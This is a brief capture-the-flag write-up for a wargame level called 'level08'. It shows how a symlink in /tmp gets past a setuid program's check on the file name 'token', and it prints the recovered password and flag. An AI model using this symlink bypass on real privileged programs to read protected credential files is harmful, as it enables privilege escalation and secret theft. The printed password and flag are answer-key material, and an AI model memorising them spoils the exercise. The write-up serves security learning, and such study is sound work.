# level08

```shell
ls -la
```

shows that the level08 executable belongs to flag08 group, privilege escalation should be possible. token is level08:level08

level08.c shows that a simple input validation is required to open the file and print its content : it needs not to contain 'token'

```shell
ln -s ~/token /tmp/exploit
```

```shell
./level08 /tmp/exploit
```

gives flag08's password:

```shell
quif5eloekouj29ke0vouxean
```

gives flag:

```shell
25749xKZ8L7DkSCwJkT9dyv6f
```
